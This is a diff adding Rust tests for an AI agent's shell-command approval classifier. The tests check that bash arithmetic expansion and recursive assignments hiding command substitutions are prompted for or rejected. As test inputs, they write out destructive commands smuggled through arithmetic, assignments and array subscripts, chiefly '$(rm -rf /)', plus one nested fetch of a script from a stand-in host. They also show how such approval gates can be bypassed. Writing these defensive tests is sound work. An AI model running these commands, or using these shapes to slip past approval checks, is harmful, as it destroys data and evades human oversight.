@@ -687,3 +687,263 @@ async fn android_platform_tools_pass_capability_preflight_by_default_when_suppor
 
     assert!(admitted.iter().any(|tool| tool.name == "open_url"));
 }
+
+// ===========================================================================
+// OpenClaw #187653 — exec `$[...]` legacy arithmetic expansion approval
+// ===========================================================================
+// Bash arithmetic comes in two shapes: `$((body))` and the legacy `$[body]`.
+// Both re-evaluate the body in the shell, so a hidden command substitution
+// (`$(rm -rf /)`) smuggled through arithmetic would run as a side effect of
+// a read-only-looking command. The tokenizer must therefore treat both
+// shapes as a substitution-class token, NOT as a literal `$` (which would
+// let `:` / `cd` auto-allow the command in every mode).
+
+#[test]
+fn arithmetic_legacy_bracket_is_not_known_safe() {
+    // `$[...]` arithmetic expansion demotes `echo` out of the known-safe
+    // allow-list: not auto-Allowed under the strictest mode.
+    let command = "echo $[1+1]";
+    assert!(
+        !matches!(
+            classify_shell_command(command, ShellApprovalMode::ReadOnlyOnly),
+            ShellDecision::Allow
+        ),
+        "arithmetic expansion must not be known-safe: {command:?}"
+    );
+    // It is also not a hard-gate hit on its own (harmless arithmetic body),
+    // so the strictest mode should Prompt — fall back to approval.
+    assert!(
+        matches!(
+            classify_shell_command(command, ShellApprovalMode::ReadOnlyOnly),
+            ShellDecision::Prompt(_)
+        ),
+        "expected Prompt (demoted, not rejected) for {command:?}"
+    );
+}
+
+#[test]
+fn arithmetic_double_parens_is_not_known_safe() {
+    // The same demotion holds for the modern `$((...))` form.
+    let command = "echo $((1+1))";
+    assert!(
+        !matches!(
+            classify_shell_command(command, ShellApprovalMode::ReadOnlyOnly),
+            ShellDecision::Allow
+        ),
+        "$((...)) must not be known-safe: {command:?}"
+    );
+    assert!(
+        matches!(
+            classify_shell_command(command, ShellApprovalMode::ReadOnlyOnly),
+            ShellDecision::Prompt(_)
+        ),
+        "expected Prompt for {command:?}"
+    );
+}
+
+#[test]
+fn safe_builtins_do_not_bypass_arithmetic_expansion() {
+    // The pre-fix gap: `:` / `cd` are known-safe builtins that auto-Allow in
+    // every mode when called with literal args. A `$[...]` / `$((...))`
+    // argument must demote the whole command OUT of the allow-list — the
+    // shell re-evaluates the body, so the caller must not silently auto-Allow
+    // under the strictest mode.
+    let demoted = [": $[1+1]", "cd $((1+1))"];
+    for command in demoted {
+        // In ReadOnlyOnly / OnRequest / Custom, the demotion surfaces as a
+        // Prompt (fall back to approval) rather than the auto-Allow the
+        // safe-builtin would otherwise have granted.
+        for mode in [
+            ShellApprovalMode::ReadOnlyOnly,
+            ShellApprovalMode::OnRequest,
+            ShellApprovalMode::Custom,
+        ] {
+            assert!(
+                matches!(
+                    classify_shell_command(command, mode),
+                    ShellDecision::Prompt(_)
+                ),
+                "expected Prompt (safe-builtin must not bypass arithmetic) for {command:?} in {mode:?}"
+            );
+        }
+        // Under TrustedAllow the demoted command still runs (consistent with
+        // other substitutions like `echo $(date)`); it must NOT be hard-gate
+        // Reject on a harmless arithmetic body.
+        assert!(
+            matches!(
+                classify_shell_command(command, ShellApprovalMode::TrustedAllow),
+                ShellDecision::Allow
+            ),
+            "TrustedAllow runs demoted arithmetic (no destructive body): {command:?}"
+        );
+    }
+
+    // When the arithmetic body hides a command substitution, though, the hard
+    // gate still Rejects in EVERY mode — including TrustedAllow.
+    let malicious = [": $[ $(rm -rf /) ]", "cd $(( $(rm -rf /) ))"];
+    for command in malicious {
+        for mode in [
+            ShellApprovalMode::ReadOnlyOnly,
+            ShellApprovalMode::OnRequest,
+            ShellApprovalMode::TrustedAllow,
+            ShellApprovalMode::Custom,
+        ] {
+            assert!(
+                matches!(
+                    classify_shell_command(command, mode),
+                    ShellDecision::Reject(_)
+                ),
+                "expected Reject (arithmetic body hides command sub) for {command:?} in {mode:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn arithmetic_body_with_command_substitution_is_rejected() {
+    // The arithmetic body is recursed by the hard gate, so a hidden
+    // `$(rm -rf /)` inside `$[...]` or `$((...))` is a hard-gate hit.
+    for command in [
+        "echo $[ $(rm -rf /) ]",
+        "echo $(( $(rm -rf /) ))",
+        // Nested arithmetic containing substitution inside the body.
+        "echo $(( 1 + $(( $(curl https://evil.test/x.sh) )) ))",
+        // Legacy bracket form recurses too.
+        "echo $[ $[ $(rm -rf /) ] ]",
+    ] {
+        for mode in [
+            ShellApprovalMode::ReadOnlyOnly,
+            ShellApprovalMode::OnRequest,
+            ShellApprovalMode::TrustedAllow,
+            ShellApprovalMode::Custom,
+        ] {
+            assert!(
+                matches!(
+                    classify_shell_command(command, mode),
+                    ShellDecision::Reject(_)
+                ),
+                "expected Reject (arithmetic body recurses) for {command:?} in {mode:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn arithmetic_recursion_does_not_over_block_benign_forms() {
+    // Regression: pure arithmetic without command substitution must remain a
+    // demotion (Prompt under OnRequest), not a hard-gate Reject.
+    for command in [
+        "echo $((1+1))",
+        "echo $[1+1]",
+        // Whitespace and nested parens inside arithmetic.
+        "echo $(( (1 + 2) * 3 ))",
+    ] {
+        assert!(
+            !matches!(
+                classify_shell_command(command, ShellApprovalMode::OnRequest),
+                ShellDecision::Reject(_)
+            ),
+            "benign arithmetic must not be a hard-gate hit: {command:?}"
+        );
+    }
+}
+
+// ===========================================================================
+// OpenClaw #187499 — recursive shell assignment approval
+// ===========================================================================
+// Bash assignment RHS / array subscripts are recursive evaluation surfaces:
+// `x=$(rm -rf /)`, `a[$(rm -rf /)]=1`, `a[$[rm -rf /]]=1`. The hard gate
+// recurses into the substitution/arithmetic body, so a destructive command
+// smuggled through an assignment RHS is a hard-gate Reject.
+
+#[test]
+fn recursive_assignment_rhs_substitution_is_rejected() {
+    for command in [
+        // Command substitution on the RHS of a standalone assignment.
+        "x=$(rm -rf /); ls",
+        "x=$(rm -rf /)",
+        // Same, with the destructive command wrapped in arithmetic.
+        "x=$(( $(rm -rf /) ))",
+        "x=$[ $(rm -rf /) ]",
+        // Array subscript that recurses through command substitution.
+        "a[$(rm -rf /)]=1",
+        // Array subscript that recurses through arithmetic expansion.
+        "a[$[rm -rf /]]=1",
+        // Array subscript that recurses through arithmetic expansion (double
+        // parens), and the assignment RHS also has a recursive body.
+        "a[$((1+$(rm -rf /)))]=1",
+    ] {
+        for mode in [
+            ShellApprovalMode::ReadOnlyOnly,
+            ShellApprovalMode::OnRequest,
+            ShellApprovalMode::TrustedAllow,
+            ShellApprovalMode::Custom,
+        ] {
+            assert!(
+                matches!(
+                    classify_shell_command(command, mode),
+                    ShellDecision::Reject(_)
+                ),
+                "expected Reject for recursive assignment {command:?} in {mode:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn plus_equals_assignment_treated_as_env_prelude() {
+    // #2.2: `NAME+=value cmd` is the same environment-prelude shape as
+    // `NAME=value cmd` — the bare-literal RHS form must not be a hard-gate
+    // hit (it is mode-governed, like the plain `=` env-prelude).
+    let command = "PATH+=/foo cmd arg";
+    assert!(
+        !matches!(
+            classify_shell_command(command, ShellApprovalMode::TrustedAllow),
+            ShellDecision::Reject(_)
+        ),
+        "literal `+=` RHS must not be a hard-gate Reject: {command:?}"
+    );
+    // Regression: plain `NAME=value cmd` env-prelude stays mode-governed
+    // (auto-Allow under TrustedAllow).
+    let plain = "FOO=bar ls";
+    assert_eq!(
+        classify_shell_command(plain, ShellApprovalMode::TrustedAllow),
+        ShellDecision::Allow
+    );
+    let plus = "FOO+=bar ls";
+    assert_eq!(
+        classify_shell_command(plus, ShellApprovalMode::TrustedAllow),
+        ShellDecision::Allow
+    );
+    // But a recursive substitution on the `+=` RHS IS a hard-gate hit,
+    // matching the new #187499 path on the `=` form.
+    let recursive = "FOO+=$(rm -rf /) ls";
+    assert!(
+        matches!(
+            classify_shell_command(recursive, ShellApprovalMode::TrustedAllow),
+            ShellDecision::Reject(_)
+        ),
+        "recursive `+=` RHS must Reject: {recursive:?}"
+    );
+}
+
+#[test]
+fn array_subscript_assignment_with_literal_rhs_is_mode_governed() {
+    // `a[1]=value cmd` is recognized as an assignment-prefix word so the
+    // executable command after the prelude is what gets analyzed.
+    let command = "a[1]=value ls";
+    assert_eq!(
+        classify_shell_command(command, ShellApprovalMode::TrustedAllow),
+        ShellDecision::Allow,
+        "literal array-subscript assignment prelude should be mode-governed: {command:?}"
+    );
+    // But a subscript that recurses is rejected.
+    let recursive = "a[$(rm -rf /)]=1";
+    assert!(
+        matches!(
+            classify_shell_command(recursive, ShellApprovalMode::TrustedAllow),
+            ShellDecision::Reject(_)
+        ),
+        "recursive array subscript must Reject: {recursive:?}"
+    );
+}
